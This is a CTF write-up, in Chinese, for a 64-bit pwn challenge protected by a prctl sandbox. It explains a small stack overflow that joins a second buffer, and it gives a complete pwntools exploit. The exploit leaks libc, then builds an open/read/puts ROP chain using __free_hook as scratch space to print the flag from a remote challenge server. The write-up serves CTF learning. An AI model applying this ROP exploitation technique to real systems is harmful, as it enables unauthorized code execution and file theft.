这个题是一个64位保护机制全开的题目

里面有两次输入，都是在栈上

第二次输入有溢出0x10，即两个字

程序开始时执行了一个`prctl`函数

![image-20210105213136408](https://static.hack1s.fun/images/2021/02/06/image-20210105213136408.png)

这个函数本身是为进程线程设置属性的

https://man7.org/linux/man-pages/man2/prctl.2.html

```C
#include <sys/prctl.h>
int prctl(int option, unsigned long arg2, unsigned long arg3,
          unsigned long arg4, unsigned long arg5);
```

我也没看懂参数，但是看wp有人说是禁用了fork和execve的系统调用



一共有两次输入

第一次输入180，不产生溢出

![image-20210105220529271](https://static.hack1s.fun/images/2021/02/06/image-20210105220529271.png)

第二次输入80，溢出0x10

![image-20210105220559363](https://static.hack1s.fun/images/2021/02/06/image-20210105220559363.png)



这个题目虽然第二次溢出时只能溢出0x10

但是这时gdb调试发现溢出的缓冲区正好能够和第一次输入连在一起

![image-20210105220405189](https://static.hack1s.fun/images/2021/02/06/image-20210105220405189.png)

也就是实际上能够控制后面整整0x180的内容

程序本身还开启了PIE，got表是不可写的，我们可以写在`__free_hook`函数的位置

或者其实也可以写在bss段、libc的bss段等等，只要有写权限就可以；



```python
from pwn import *

io = remote('node3.buuoj.cn',27337)
#io = process('./vn_pwn_warmup')
elf = ELF('./vn_pwn_warmup')

io.recvuntil('gift: ')

puts_addr = int(io.recvline()[:-1],16)

libc = ELF('../lib/libc-2.23.so')

#libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.sym['puts']

pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi\nret',arch='amd64')))
pop_rsi_ret = libc_base + next(libc.search(asm('pop rsi\nret',arch='amd64')))
pop_rdx_ret = libc_base + next(libc.search(asm('pop rdx\nret',arch='amd64')))

open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']

free_hook = libc_base + libc.sym['__free_hook']

payload = b'a'*0x70 + b'b'*0x8
payload += p64(pop_rdi_ret)

payload2 = p64(0) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) +  p64(4) + p64(read_addr)
# read(0,free_hook,4)
payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
# open(free_hook,7)
payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) + p64(100) + p64(read_addr)
# read(3,free_hook,100)

payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)
# puts(free_hook)

io.recvuntil('something: ')

io.send(payload2)

io.recvuntil('name?')

io.send(payload)

io.send('flag')

io.interactive()
```

调试了半天发现一直不对劲，最后发现是send和sendline的问题；